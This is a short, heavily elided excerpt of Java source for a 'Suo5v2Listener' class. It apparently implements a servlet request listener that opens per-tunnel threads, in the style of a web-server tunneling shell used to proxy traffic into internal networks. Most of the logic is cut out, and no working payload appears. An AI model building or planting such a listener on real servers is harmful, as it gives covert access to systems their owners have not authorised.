 ...
 * @since 2025/12/9
 */
public class Suo5v2Listener implements ServletRequestListener, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5v2Listener(InputStream in, OutputStream out, String tunId) {
        this.gInStream = in;
        this.gOutStream = out;
        this.gtunId = tunId;
    }

    public Suo5v2Listener(String tunId, int mode) {
        this.gtunId = tunId;
        this.mode = mode;
    }
...
//
    ...
    private byte[] performCreate(HttpServletRequest request, HashMap dataMap, String tunId, boolean newThread) throws Exception {
        ...
        try {
            ...
            if (newThread) {
                new Thread(new Suo5v2Listener(tunId, 1)).start();
                new Thread(new Suo5v2Listener(tunId, 2)).start();
            }
        } catch (Exception e) {
